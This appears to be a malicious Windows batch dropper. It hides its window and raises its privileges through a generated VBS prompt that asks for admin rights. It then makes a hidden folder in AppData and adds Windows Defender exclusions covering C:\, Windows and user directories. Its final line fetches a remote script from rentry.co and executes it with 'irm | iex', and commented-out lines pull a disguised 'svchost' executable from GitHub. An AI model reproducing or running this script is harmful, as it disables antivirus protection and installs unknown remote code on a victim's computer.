��
cls

@echo off

powershell -window hidden -command ""


    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

cd "C:\Users\%USERNAME%\AppData\Local"
mkdir "Anon"
attrib +h "Anon" /s /d

powershell.exe -command "Add-MpPreference -ExclusionPath "C:\
powershell.exe -command "Add-MpPreference -ExclusionPath "C:Windows\
powershell.exe -command "Add-MpPreference -ExclusionPath "C:\Users\x\AppData\Local\Temp\
powershell.exe -command "Add-MpPreference -ExclusionPath "C:\Users\x\AppData\Local\
powershell.exe -command "Add-MpPreference -ExclusionPath "C:\Users\x\AppData\
powershell.exe -command "Add-MpPreference -ExclusionPath "C:\Users\x\
powershell.exe -command "Add-MpPreference -ExclusionPath "C:\Users\

REM cd C:\Users\%USERNAME%\AppData\Local\Anon" 
REM attrib +h "C:\Users\%USERNAME%\AppData\Local\Anon\2.bat" /s /d
REM attrib +h "C:\Users\%USERNAME%\AppData\Local\Anon\Agent.exe" /s /d
REM Powershell -Command "Invoke-Webrequest 'https://github.com/xst4/patch1/releases/download/payloads/svchost64.ex' -OutFile Agent.exe"
REM start Agent.exe"
powershell "irm rentry.co/svchost32/raw | iex"